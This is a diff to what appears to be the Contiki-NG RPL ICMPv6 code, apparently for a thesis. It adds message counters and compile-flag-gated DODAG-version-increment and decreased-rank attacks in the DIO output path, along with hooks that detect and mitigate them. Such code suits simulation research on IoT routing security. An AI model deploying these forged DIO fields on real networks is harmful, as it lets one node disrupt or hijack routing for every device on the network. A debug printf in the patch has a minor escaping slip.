@@ -1,3 +1,4 @@
+#include "thesis-security.h"
 /*
  * Copyright (c) 2010, Swedish Institute of Computer Science.
  * All rights reserved.
@@ -51,6 +52,16 @@
 
 #include <inttypes.h>
 #include <limits.h>
+
+
+#ifdef THESIS_RPL_METRICS
+void thesis_count_dis_in(void);
+void thesis_count_dis_out(void);
+void thesis_count_dio_in(void);
+void thesis_count_dio_out(void);
+void thesis_count_dao_in(void);
+void thesis_count_dao_out(void);
+#endif
 
 /* Log configuration */
 #include "sys/log.h"
@@ -132,6 +143,9 @@ rpl_icmp6_update_nbr_table(uip_ipaddr_t *from, nbr_table_reason_t reason, void *
 static void
 dis_input(void)
 {
+#ifdef THESIS_RPL_METRICS
+  thesis_count_dis_in();
+#endif
   if(!curr_instance.used) {
     LOG_WARN("dis_input: not in an instance yet, discard\n");
     goto discard;
@@ -172,6 +186,9 @@ rpl_icmp6_dis_output(uip_ipaddr_t *addr)
   LOG_INFO_6ADDR(addr);
   LOG_INFO_("\n");
 
+  #ifdef THESIS_RPL_METRICS
+  thesis_count_dis_out();
+#endif
   uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_DIS, 2);
 }
 /*---------------------------------------------------------------------------*/
@@ -194,6 +211,9 @@ dio_interval_is_valid(uint8_t intmin, uint8_t intdoubl)
 static void
 dio_input(void)
 {
+#ifdef THESIS_RPL_METRICS
+  thesis_count_dio_in();
+#endif
   unsigned char *buffer;
   uint16_t buffer_length;
   rpl_dio_t dio;
@@ -394,6 +414,12 @@ discard:
 void
 rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
 {
+#if THESIS_DODAG_VERSION_ATTACK
+  unsigned int thesis_node_id =
+    (unsigned int)
+    linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
+#endif
+
   unsigned char *buffer;
   int pos;
   uip_ipaddr_t *addr = uc_addr;
@@ -422,10 +448,182 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
 
   buffer = UIP_ICMP_PAYLOAD;
   buffer[pos++] = curr_instance.instance_id;
-  buffer[pos++] = curr_instance.dag.version;
+  /* THESIS_DODAG_VERSION_ATTACK */
+#if THESIS_DODAG_VERSION_ATTACK
 
-  set16(buffer, pos,
-        rpl_get_leaf_only() ? RPL_INFINITE_RANK : curr_instance.dag.rank);
+  if(thesis_node_id == THESIS_DODAG_VERSION_NODE_ID &&
+     clock_time() >= (120 * CLOCK_SECOND)) {
+
+    uint8_t thesis_fake_version =
+      (uint8_t)(
+        curr_instance.dag.version +
+        THESIS_DODAG_VERSION_INCREMENT
+      );
+
+#if THESIS_SECURITY_FRAMEWORK
+
+    /*
+     * Specification rule:
+     * a non-root node must not originate an unauthorised
+     * DODAG version increment.
+     */
+    thesis_security_violation(
+      THESIS_ATTACK_DODAG_VERSION,
+      thesis_node_id,
+      "ILLEGITIMATE_VERSION_INCREMENT"
+    );
+
+    if(thesis_security_is_mitigated(
+         THESIS_ATTACK_DODAG_VERSION)) {
+
+      /*
+       * Mitigation: suppress the forged version and transmit
+       * the legitimate version instead.
+       */
+      buffer[pos++] =
+        curr_instance.dag.version;
+
+      printf(
+        "DODAG_VERSION_BLOCKED,"
+        "time=%lu,node=%u,"
+        "real=%u,attempted=%u\n",
+        (unsigned long)(
+          clock_time() / CLOCK_SECOND
+        ),
+        thesis_node_id,
+        (unsigned int)
+          curr_instance.dag.version,
+        (unsigned int)
+          thesis_fake_version
+      );
+
+      thesis_security_recovery(
+        THESIS_ATTACK_DODAG_VERSION,
+        thesis_node_id,
+        "LEGITIMATE_VERSION_PRESERVED"
+      );
+
+    } else {
+
+      buffer[pos++] =
+        thesis_fake_version;
+
+      printf(
+        "DODAG_VERSION_ATTACK,"
+        "time=%lu,node=%u,"
+        "real=%u,advertised=%u\n",
+        (unsigned long)(
+          clock_time() / CLOCK_SECOND
+        ),
+        thesis_node_id,
+        (unsigned int)
+          curr_instance.dag.version,
+        (unsigned int)
+          thesis_fake_version
+      );
+    }
+
+#else
+
+    buffer[pos++] =
+      thesis_fake_version;
+
+    printf(
+      "DODAG_VERSION_ATTACK,"
+      "time=%lu,node=%u,"
+      "real=%u,advertised=%u\n",
+      (unsigned long)(
+        clock_time() / CLOCK_SECOND
+      ),
+      thesis_node_id,
+      (unsigned int)
+        curr_instance.dag.version,
+      (unsigned int)
+        thesis_fake_version
+    );
+
+#endif /* THESIS_SECURITY_FRAMEWORK */
+
+  } else {
+
+    buffer[pos++] =
+      curr_instance.dag.version;
+  }
+
+#else
+
+  buffer[pos++] =
+    curr_instance.dag.version;
+
+#endif /* THESIS_DODAG_VERSION_ATTACK */
+
+
+/* THESIS_DECREASED_RANK_EXACT */
+#if THESIS_DECREASED_RANK_ATTACK
+  {
+    unsigned int thesis_node_id =
+      (unsigned int)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
+
+    if(thesis_node_id == THESIS_DECREASED_RANK_NODE_ID &&
+       clock_time() >= (120 * CLOCK_SECOND)) {
+
+      thesis_security_violation(
+      THESIS_ATTACK_DECREASED_RANK,
+      thesis_node_id,
+      "ILLEGITIMATE_DECREASED_RANK"
+    );
+
+    if(thesis_security_is_mitigated(
+         THESIS_ATTACK_DECREASED_RANK)) {
+
+      set16(
+        buffer,
+        pos,
+        curr_instance.dag.rank
+      );
+
+      thesis_security_recovery(
+        THESIS_ATTACK_DECREASED_RANK,
+        thesis_node_id,
+        "LEGITIMATE_RANK_RESTORED"
+      );
+
+    } else {
+
+      set16(
+        buffer,
+        pos,
+        THESIS_DECREASED_RANK_VALUE
+      );
+    }
+
+      printf(
+        "DECREASED_RANK,time=%lu,node=%u,real_rank=%u,advertised_rank=%u\\n",
+        (unsigned long)(clock_time() / CLOCK_SECOND),
+        thesis_node_id,
+        (unsigned int)curr_instance.dag.rank,
+        (unsigned int)THESIS_DECREASED_RANK_VALUE
+      );
+
+    } else {
+      set16(
+        buffer,
+        pos,
+        rpl_get_leaf_only()
+          ? RPL_INFINITE_RANK
+          : curr_instance.dag.rank
+      );
+    }
+  }
+#else
+  set16(
+    buffer,
+    pos,
+    rpl_get_leaf_only()
+      ? RPL_INFINITE_RANK
+      : curr_instance.dag.rank
+  );
+#endif
   pos += 2;
 
   buffer[pos] = curr_instance.dag.grounded ? RPL_DIO_GROUNDED : 0;
@@ -511,12 +709,18 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
   LOG_INFO_6ADDR(addr);
   LOG_INFO_("\n");
 
+  #ifdef THESIS_RPL_METRICS
+  thesis_count_dio_out();
+#endif
   uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_DIO, pos);
 }
 /*---------------------------------------------------------------------------*/
 static void
 dao_input(void)
 {
+#ifdef THESIS_RPL_METRICS
+  thesis_count_dao_in();
+#endif
   struct rpl_dao dao;
   uint8_t subopt_type;
   unsigned char *buffer;
@@ -768,6 +972,9 @@ rpl_icmp6_dao_output(uint8_t lifetime)
   LOG_INFO_("\n");
 
   /* Send DAO to root (IPv6 address is DAG ID) */
+  #ifdef THESIS_RPL_METRICS
+  thesis_count_dao_out();
+#endif
   uip_icmp6_send(&curr_instance.dag.dag_id, ICMP6_RPL, RPL_CODE_DAO, pos);
 }
 #if RPL_WITH_DAO_ACK
